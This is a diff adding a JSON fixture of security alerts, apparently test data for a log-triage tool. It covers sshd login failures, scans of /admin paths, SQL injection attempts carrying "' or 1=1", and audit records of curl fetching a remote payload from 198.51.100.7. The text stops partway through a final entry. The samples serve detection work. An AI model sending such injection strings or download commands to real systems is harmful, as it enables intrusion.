+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.9",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:08:02.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.9",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:08:03.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.9",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:08:04.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.9",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:09:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.10",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:09:01.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.10",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:09:02.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.10",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:09:03.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.10",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:09:04.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.10",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:10:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.11",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:10:01.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.11",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:10:02.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.11",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:10:03.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.11",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:10:04.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.11",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:11:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.12",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:11:01.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.12",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:11:02.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.12",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:11:03.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.12",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T01:11:04.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.12",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T02:00:00.000+0000",
+  "agent": {
+   "name": "web-02"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.1",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T02:01:00.000+0000",
+  "agent": {
+   "name": "web-02"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.2",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T02:02:00.000+0000",
+  "agent": {
+   "name": "web-02"
+  },
+  "rule": {
+   "id": "5716",
+   "level": 5,
+   "description": "sshd: authentication failed.",
+   "groups": [
+    "sshd"
+   ]
+  },
+  "data": {
+   "srcip": "10.20.0.3",
+   "dstuser": "dave"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T05:00:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web",
+    "accesslog"
+   ]
+  },
+  "data": {
+   "srcip": "45.33.32.200",
+   "url": "/admin/0?id=0",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T05:01:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web",
+    "accesslog"
+   ]
+  },
+  "data": {
+   "srcip": "45.33.32.200",
+   "url": "/admin/1?id=1",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T05:02:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web",
+    "accesslog"
+   ]
+  },
+  "data": {
+   "srcip": "45.33.32.200",
+   "url": "/admin/2?id=2",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T05:03:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web",
+    "accesslog"
+   ]
+  },
+  "data": {
+   "srcip": "45.33.32.200",
+   "url": "/admin/3?id=3",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T05:04:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web",
+    "accesslog"
+   ]
+  },
+  "data": {
+   "srcip": "45.33.32.200",
+   "url": "/admin/0?id=4",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T05:05:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web",
+    "accesslog"
+   ]
+  },
+  "data": {
+   "srcip": "45.33.32.200",
+   "url": "/admin/1?id=5",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T05:06:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web",
+    "accesslog"
+   ]
+  },
+  "data": {
+   "srcip": "45.33.32.200",
+   "url": "/admin/2?id=6",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T05:07:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web",
+    "accesslog"
+   ]
+  },
+  "data": {
+   "srcip": "45.33.32.200",
+   "url": "/admin/3?id=7",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T05:08:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web",
+    "accesslog"
+   ]
+  },
+  "data": {
+   "srcip": "45.33.32.200",
+   "url": "/admin/0?id=8",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T05:09:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web",
+    "accesslog"
+   ]
+  },
+  "data": {
+   "srcip": "45.33.32.200",
+   "url": "/admin/1?id=9",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T05:10:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web",
+    "accesslog"
+   ]
+  },
+  "data": {
+   "srcip": "45.33.32.200",
+   "url": "/admin/2?id=10",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T05:11:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web",
+    "accesslog"
+   ]
+  },
+  "data": {
+   "srcip": "45.33.32.200",
+   "url": "/admin/3?id=11",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T05:12:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web",
+    "accesslog"
+   ]
+  },
+  "data": {
+   "srcip": "45.33.32.200",
+   "url": "/admin/0?id=12",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T05:13:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web",
+    "accesslog"
+   ]
+  },
+  "data": {
+   "srcip": "45.33.32.200",
+   "url": "/admin/1?id=13",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T05:14:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web",
+    "accesslog"
+   ]
+  },
+  "data": {
+   "srcip": "45.33.32.200",
+   "url": "/admin/2?id=14",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T05:15:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web",
+    "accesslog"
+   ]
+  },
+  "data": {
+   "srcip": "45.33.32.200",
+   "url": "/admin/3?id=15",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T05:16:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web",
+    "accesslog"
+   ]
+  },
+  "data": {
+   "srcip": "45.33.32.200",
+   "url": "/admin/0?id=16",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T05:17:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web",
+    "accesslog"
+   ]
+  },
+  "data": {
+   "srcip": "45.33.32.200",
+   "url": "/admin/1?id=17",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T05:18:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web",
+    "accesslog"
+   ]
+  },
+  "data": {
+   "srcip": "45.33.32.200",
+   "url": "/admin/2?id=18",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T05:19:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web",
+    "accesslog"
+   ]
+  },
+  "data": {
+   "srcip": "45.33.32.200",
+   "url": "/admin/3?id=19",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T05:20:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web",
+    "accesslog"
+   ]
+  },
+  "data": {
+   "srcip": "45.33.32.200",
+   "url": "/admin/0?id=20",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T05:21:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web",
+    "accesslog"
+   ]
+  },
+  "data": {
+   "srcip": "45.33.32.200",
+   "url": "/admin/1?id=21",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T05:22:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web",
+    "accesslog"
+   ]
+  },
+  "data": {
+   "srcip": "45.33.32.200",
+   "url": "/admin/2?id=22",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T05:23:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web",
+    "accesslog"
+   ]
+  },
+  "data": {
+   "srcip": "45.33.32.200",
+   "url": "/admin/3?id=23",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T05:24:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web",
+    "accesslog"
+   ]
+  },
+  "data": {
+   "srcip": "45.33.32.200",
+   "url": "/admin/0?id=24",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T05:30:00.000+0000",
+  "agent": {
+   "name": "web-02"
+  },
+  "rule": {
+   "id": "200007",
+   "level": 7,
+   "description": "SQL injection attempt.",
+   "groups": [
+    "web"
+   ]
+  },
+  "data": {
+   "srcip": "45.33.32.200",
+   "url": "/login?u=' or 1=1",
+   "status": "403"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T05:31:00.000+0000",
+  "agent": {
+   "name": "web-02"
+  },
+  "rule": {
+   "id": "200007",
+   "level": 7,
+   "description": "SQL injection attempt.",
+   "groups": [
+    "web"
+   ]
+  },
+  "data": {
+   "srcip": "45.33.32.200",
+   "url": "/login?u=' or 1=1",
+   "status": "403"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T06:00:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web"
+   ]
+  },
+  "data": {
+   "srcip": "45.33.32.201",
+   "url": "/x",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T06:01:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web"
+   ]
+  },
+  "data": {
+   "srcip": "45.33.32.201",
+   "url": "/x",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T06:02:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web"
+   ]
+  },
+  "data": {
+   "srcip": "45.33.32.201",
+   "url": "/x",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T07:00:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web"
+   ]
+  },
+  "data": {
+   "srcip": "10.30.0.1",
+   "url": "/y",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T07:01:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web"
+   ]
+  },
+  "data": {
+   "srcip": "10.30.0.1",
+   "url": "/y",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T07:02:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web"
+   ]
+  },
+  "data": {
+   "srcip": "10.30.0.1",
+   "url": "/y",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T07:03:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web"
+   ]
+  },
+  "data": {
+   "srcip": "10.30.0.1",
+   "url": "/y",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T07:04:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web"
+   ]
+  },
+  "data": {
+   "srcip": "10.30.0.1",
+   "url": "/y",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T07:05:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web"
+   ]
+  },
+  "data": {
+   "srcip": "10.30.0.1",
+   "url": "/y",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T07:06:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web"
+   ]
+  },
+  "data": {
+   "srcip": "10.30.0.1",
+   "url": "/y",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T07:07:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web"
+   ]
+  },
+  "data": {
+   "srcip": "10.30.0.1",
+   "url": "/y",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T07:08:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web"
+   ]
+  },
+  "data": {
+   "srcip": "10.30.0.1",
+   "url": "/y",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T07:09:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web"
+   ]
+  },
+  "data": {
+   "srcip": "10.30.0.1",
+   "url": "/y",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T07:10:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web"
+   ]
+  },
+  "data": {
+   "srcip": "10.30.0.1",
+   "url": "/y",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T07:11:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web"
+   ]
+  },
+  "data": {
+   "srcip": "10.30.0.1",
+   "url": "/y",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T07:12:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web"
+   ]
+  },
+  "data": {
+   "srcip": "10.30.0.1",
+   "url": "/y",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T07:13:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web"
+   ]
+  },
+  "data": {
+   "srcip": "10.30.0.1",
+   "url": "/y",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T07:14:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web"
+   ]
+  },
+  "data": {
+   "srcip": "10.30.0.1",
+   "url": "/y",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T07:15:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web"
+   ]
+  },
+  "data": {
+   "srcip": "10.30.0.1",
+   "url": "/y",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T07:16:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web"
+   ]
+  },
+  "data": {
+   "srcip": "10.30.0.1",
+   "url": "/y",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T07:17:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web"
+   ]
+  },
+  "data": {
+   "srcip": "10.30.0.1",
+   "url": "/y",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T07:18:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web"
+   ]
+  },
+  "data": {
+   "srcip": "10.30.0.1",
+   "url": "/y",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T07:19:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web"
+   ]
+  },
+  "data": {
+   "srcip": "10.30.0.1",
+   "url": "/y",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T07:20:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web"
+   ]
+  },
+  "data": {
+   "srcip": "10.30.0.1",
+   "url": "/y",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T07:21:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web"
+   ]
+  },
+  "data": {
+   "srcip": "10.30.0.1",
+   "url": "/y",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T07:22:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web"
+   ]
+  },
+  "data": {
+   "srcip": "10.30.0.1",
+   "url": "/y",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T07:23:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web"
+   ]
+  },
+  "data": {
+   "srcip": "10.30.0.1",
+   "url": "/y",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T07:24:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web"
+   ]
+  },
+  "data": {
+   "srcip": "10.30.0.1",
+   "url": "/y",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T07:25:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web"
+   ]
+  },
+  "data": {
+   "srcip": "10.30.0.1",
+   "url": "/y",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T07:26:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web"
+   ]
+  },
+  "data": {
+   "srcip": "10.30.0.1",
+   "url": "/y",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T07:27:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web"
+   ]
+  },
+  "data": {
+   "srcip": "10.30.0.1",
+   "url": "/y",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T07:28:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web"
+   ]
+  },
+  "data": {
+   "srcip": "10.30.0.1",
+   "url": "/y",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-14T07:29:00.000+0000",
+  "agent": {
+   "name": "web-01"
+  },
+  "rule": {
+   "id": "200006",
+   "level": 3,
+   "description": "Web request to an unusual path.",
+   "groups": [
+    "web"
+   ]
+  },
+  "data": {
+   "srcip": "10.30.0.1",
+   "url": "/y",
+   "status": "404"
+  }
+ },
+ {
+  "timestamp": "2026-11-15T01:00:00.000+0000",
+  "agent": {
+   "name": "app-06"
+  },
+  "rule": {
+   "id": "200009",
+   "level": 14,
+   "description": "Download tool fetched a remote payload.",
+   "groups": []
+  },
+  "data": {
+   "audit": {
+    "execve": {
+     "a0": "curl",
+     "a1": "http://198.51.100.7/a"
+    },
+    "exe": "/usr/bin/curl",
+    "auid": "1000"
+   }
+  }
+ },
+ {
+  "timestamp": "2026-11-15T01:10:00.000+0000",
+  "agent": {
+   "name": "app-06"
+  },
+  "rule": {
+   "id": "200009",
+   "level": 14,
+   "description": "Download tool fetched a remote payload.",
+   "groups": []
+  },
+  "data": {
+   "audit": {
+    "execve": {
+     "a0": "curl",
+     "a1": "http://198.51.100.7/b"
+    },
+    "exe": "/usr/bin/curl",
+    "auid": "1000"
+   }
+  }
+ },
+ {
+  "timestamp": "2026-11-15T04:00:00.000+0000",
